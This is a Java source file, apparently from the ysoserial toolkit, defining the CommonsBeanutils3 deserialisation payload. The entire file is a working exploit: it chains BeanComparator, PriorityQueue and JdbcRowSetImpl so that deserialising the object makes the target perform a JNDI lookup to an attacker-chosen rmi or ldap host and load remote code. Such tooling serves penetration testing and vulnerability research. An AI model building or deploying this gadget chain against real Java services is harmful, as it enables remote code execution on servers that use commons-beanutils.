package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;

import java.math.BigInteger;
import java.util.PriorityQueue;

@Authors({Authors.Su8})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
public class CommonsBeanutils3 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		} else {
			throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
		}

		BeanComparator comparator = new BeanComparator("lowestSetBit");
		JdbcRowSetImpl rs         = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("su18");
		PriorityQueue queue = new PriorityQueue(2, comparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = rs;
		queueArray[1] = rs;
		return queue;
	}
}
